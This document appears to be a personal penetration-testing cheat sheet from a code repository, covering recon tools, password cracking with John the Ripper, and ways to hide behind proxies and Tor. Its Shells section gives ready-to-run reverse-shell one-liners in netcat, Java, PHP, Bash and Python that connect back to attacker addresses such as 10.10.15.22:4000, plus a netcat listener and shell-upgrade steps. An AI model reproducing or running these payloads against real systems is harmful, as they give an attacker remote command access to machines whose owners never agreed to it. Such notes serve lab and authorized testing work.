* [CheatSheet](#cheatsheet)
   * [Planned ToDo's](#planned-todos)
   * [Useful Guides and Links](#useful-guides-and-links)
   * [Local Webserver](#local-webserver)
      * [Python](#python)
      * [PHP](#php)
      * [Ruby](#ruby)
   * [Useful Tools](#useful-tools)
      * [<a href="https://tools.kali.org/information-gathering/nmap" rel="nofollow">nmap</a>](#nmap)
      * [<a href="https://tools.kali.org/web-applications/gobuster" rel="nofollow">gobuster</a>](#gobuster)
      * [<a href="https://tools.kali.org/password-attacks/cewl" rel="nofollow">CeWL</a>](#cewl)
      * [<a href="https://tools.kali.org/information-gathering/enum4linux" rel="nofollow">enum4linux</a>](#enum4linux)
      * [<a href="https://tools.kali.org/information-gathering/goofile" rel="nofollow">goofile</a>](#goofile)
      * [<a href="https://www.exploit-db.com/searchsploit" rel="nofollow">searchsploit</a>](#searchsploit)
      * [<a href="https://tools.kali.org/password-attacks/john" rel="nofollow">John The Ripper – JTR</a>](#john-the-ripper--jtr)
   * [Shells](#shells)
      * [Set Listener](#set-listener)
      * [<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="nofollow">Reverse Shell</a>](#reverse-shell)
         * [netcat](#netcat)
         * [Java](#java)
         * [PHP](#php-1)
         * [Bash](#bash)
         * [Python](#python-1)
      * [Interactive Shell](#interactive-shell)
         * [Bash](#bash-1)
         * [Zsh](#zsh)
   * [Usefuls Scripts](#usefuls-scripts)
      * [HEX Converter](#hex-converter)
         * [Ascii to Hex](#ascii-to-hex)
         * [Hex to Ascii](#hex-to-ascii)
   * [Hide yourself](#hide-yourself)
      * [<a href="">VPN</a>](#vpn)
      * [<a href="https://linuxhint.com/proxychains-tutorial/" rel="nofollow">Proxy Chains</a>](#proxy-chains)
      * [<a href="https://de.wikipedia.org/wiki/Tor_(Netzwerk)" rel="nofollow">Tor</a>](#tor)
   * [<a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/" rel="nofollow">Shellcode Dis/Assembler</a>](#shellcode-disassembler)

# CheatSheet

## Planned ToDo's	

* write scripts for automating the repetitive tasks like:
  1. look for domain of the company
  2. look for subdomains of the domain 
  3. look for dns entries 
  4. use [Google Hacking](https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06) for deeper recon
  5. generate a detailed report of all findings
  6. ...

* create a docker-based environment for pentesting/bug bounty hunting (find a way for running GUI based tools in docker) 	

## Useful Guides and Links

For Pentesting/BugBounty-Hunting there is a very detailed [map and guide](https://www.offensity.com/de/blog/just-another-recon-guide-pentesters-and-bug-bounty-hunters/) of how to proceed.

Very useful BugBounty [CheatSheet](https://github.com/EdOverflow/bugbounty-cheatsheet) from EdOverflow

Bug Bounty [Writeups](https://hackerone.com/hacktivity) for learning 

## Local Webserver

### Python

```python
python -m SimpleHTTPServer
```

```python
python3 -m http.server
```

### PHP
```php
php -S 0.0.0.0:8000
```
### Ruby
```ruby
ruby -run -e httpd . -p 8000
```
## Useful Tools

### [nmap](https://tools.kali.org/information-gathering/nmap)
```shell-script
nmap -sC -sV -oA nmap/openadmin 10.10.10.171
```
* `-sC` = scans with the standard scripts
* `-sV` = scans the versions

### [gobuster](https://tools.kali.org/web-applications/gobuster)
bruteforce websites to find directories and/or files
```bash
gobuster dir -u http://10.10.10.10/ -w /path/to/wordlist
```
###  [CeWL](https://tools.kali.org/password-attacks/cewl)
creates wordlist from website
```bash
cewl -d 2 -m 5 -w genwords.txt https://10.10.10.10
```
### [enum4linux](https://tools.kali.org/information-gathering/enum4linux)
enumerates Windows and Samba systems 

Ports to look for: 445, 139
```bash
enum4linux -U -o 10.10.10.10
```
### [goofile](https://tools.kali.org/information-gathering/goofile)
finding specific filetypes in domain
```bash
goofile -d kali.org -f pdf
```
### [searchsploit](https://www.exploit-db.com/searchsploit)
```bash
searchsploit tomcat
```
### [John The Ripper – JTR](https://tools.kali.org/password-attacks/john)

John the Ripper is different from tools like Hydra. Hydra does blind brute-forcing by trying username/password combinations on a service daemon like ftp server or telnet server. John however needs the hash first. So the greater challenge for a hacker is to first get the hash that is to be cracked. Now a days hashes are more easily crackable using free rainbow tables available online. Just go to one of the sites, submit the hash and if the hash is made of a common word, then the site would show the word almost instantly. Rainbow tables basically store common words and their hashes in a large database. Larger the database, more the words covered.
|Command                                                                 |Description                               |
|------------------------------------------------------------------------|------------------------------------------|
|john –wordlist=/usr/share/wordlists/rockyou.txt hash                    |JTR password cracking                     |
|john –format=descrypt –wordlist/usr/share/wordlists/rockyou.txt hash.txt|JTR forced descrypt cracking with wordlist|
|john –format=descrypt hash –show                                        |JTR forced descrypt brute force cracking  |

## Shells

### Set Listener 
```bash
nc -lnvp 4000
```

### [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
#### netcat
```bash
nc -e /bin/sh 10.10.15.22 4000
```
#### Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.15.22/4000;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
#### PHP
```php
php -r '$sock=fsockopen("10.10.15.22",4000);exec("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```
#### Bash
```bash
bash -i >& /dev/tcp/10.10.15.22/4000 0>&1
```
#### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.22",4000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
### Interactive Shell
* can be executed with python or python3
#### Bash 
```python
python(3) -c 'import pty; pty.spawn("/bin/bash")'
```
```cmd
Ctrl-Z
```
```cmd
stty raw -echo
```
```
fg
```
#### Zsh 
```python
python(3) -c 'import pty; pty.spawn("/bin/bash")'
```
```cmd
Ctrl-Z
```
```cmd
stty raw -echo; fg
```
## Usefuls Scripts
### HEX Converter
#### Ascii to Hex
```bash
#!/bin/bash
echo $1 | tr -d “\n” | hexdump -e ‘16/1 “%02x “ “\n”‘
```
#### Hex to Ascii
```bash
#!/bin/bash
echo $1 | xxd -r -p
```
## Hide yourself
Interesting [Stack Exchange](https://security.stackexchange.com/questions/103792/is-using-vpn-tor-and-proxychains-together-more-secure) link
### [VPN]()
### [Proxy Chains](https://linuxhint.com/proxychains-tutorial/)
A Proxy is an instance between both communication partners. If you send a request to a server the proxy intercepts it and is forwarding this request to the server but is behaving like itself send the request so the server don't know about me. And the exact way back.

A Proxy Chain are multile Proxy Servers chained together so it is way more difficult to get to know the initial sender(client)
### [Tor](https://de.wikipedia.org/wiki/Tor_(Netzwerk))
Here is a nice [graphic](https://www.eff.org/pages/tor-and-https) on who sees what in Tor and HTTPS cases.

## [Shellcode Dis/Assembler](http://shell-storm.org/online/Online-Assembler-and-Disassembler/)


